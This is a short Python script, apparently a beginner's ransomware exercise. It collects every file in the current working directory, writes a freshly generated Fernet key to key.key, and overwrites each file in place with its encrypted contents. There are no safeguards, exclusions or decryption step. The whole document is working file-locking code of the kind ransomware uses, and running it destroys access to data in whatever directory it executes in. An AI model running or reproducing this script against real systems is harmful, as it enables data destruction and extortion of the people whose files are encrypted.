#encrypting the files

import os
from cryptography.fernet import Fernet

files=[]

for i in os.listdir():#here i is everyfile that it could acesses
    if os.path.isfile(i):
        files.append(i)

print(files)


key =Fernet.generate_key()#generation of key
with open("key.key","wb") as f:
    f.write(key) 

#the encryption here  ----v-----
for i in files:
    with open(i,"rb") as f1:
        stuff=f1.read()
    stuff_encrypted=Fernet(key).encrypt(stuff)
    with open(i,"wb") as f1:
        f1.write(stuff_encrypted)